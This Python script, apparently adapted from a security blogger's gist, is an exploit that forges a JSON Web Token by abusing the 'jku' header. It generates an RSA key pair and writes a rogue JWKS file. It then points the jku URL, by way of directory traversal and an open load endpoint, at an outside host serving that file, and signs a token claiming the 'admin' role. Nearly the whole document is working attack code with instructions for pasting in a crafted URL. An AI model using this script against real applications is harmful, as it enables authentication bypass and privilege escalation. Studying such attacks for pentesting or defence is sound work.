# For more description with other attacks check out my BLOG ==> https://imparable.medium.com/attacking-json-web-tokens-jwts-d1d51a1e17cb
# Code modified from https://gist.github.com/imparabl3/efcf4a991244b9f8f99ac39a7c8cfe6f

import OpenSSL
import base64
import json
import hashlib
import urllib

from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding

# Creating Private Key
key = OpenSSL.crypto.PKey()
key.generate_key(type=OpenSSL.crypto.TYPE_RSA,bits=2048)
priv = key.to_cryptography_key()
# Creating Public Key
pub = priv.public_key()

# Creating "n" and "e" attributes for JWK 
n = pub.public_numbers().n
e = pub.public_numbers().e
e = base64.urlsafe_b64encode((e).to_bytes((e).bit_length()//8+1, byteorder='big')).decode('UTF-8').rstrip("=")
n = base64.urlsafe_b64encode((n).to_bytes((n).bit_length()//8+1, byteorder='big')).decode('UTF-8').rstrip("=")

# Public keys in JSON format
jwks = { "keys": [
    {
      "kty": "RSA",
      "use": "sig",
      "kid": "imparable",
       "n": n,
       "e": e,
      "alg": "RS256"
    }
  ]
}

jwk = json.dumps(jwks)
with open("json/jwks.json", 'wt') as f:
    f.write(jwk)

### ====================
# Suppose if an Application is checking for this URL in "jku" Header ==> https://trustedsite.com/.well-known/jwks.json
# And you found a HTTP response Header injection in ==> https://application.com/endpoint?id=value

# Here "id" parameter is vulnerable and now you can combine this path with the whitelisted "jku" URL to craft the exploit:
# For example: Crafted URL ==> https://trustedsite.com/.well-known/jwks.json/../../endpoint?id=value

# Note: This exploit would not be possible without directory traversal attack.
### ====================

# Paste your Crafted URL like explained above and Content-Length header will be set to the correct value and inline JWKS
payload = "http://127.0.0.1:4000/.well-known/jwks.json/../../load/http://104.12.120.24:8080/jwks.json"

# Header section of JWT
header = {"kid":"imparable","alg":"RS256","jku":""}

# Paste your Payload section of JWT
body = {"exp": 1704203701,
  "iat": 1691200101,
  "role": "admin",
  "sub": "Fernanman_d36893"}


# Adding payload in "jku" parameter
header["jku"] = payload

# Encoding Header and Payload section of JWT
enc_header = base64.urlsafe_b64encode(bytes(json.dumps(header), encoding="UTF-8")).decode('UTF-8').rstrip("=")
enc_body = base64.urlsafe_b64encode(bytes(json.dumps(body), encoding="UTF-8")).decode('UTF-8').rstrip("=")

# Concatenation of encoded Header and Payload 
token = (enc_header + "." + enc_body)

# Creating Signature
sig = priv.sign(bytes(token, encoding="UTF-8"), algorithm=hashes.SHA256(), padding=padding.PKCS1v15())

# Printing final JWT
print(token + "." + base64.urlsafe_b64encode(sig).decode("UTF-8").rstrip("="))
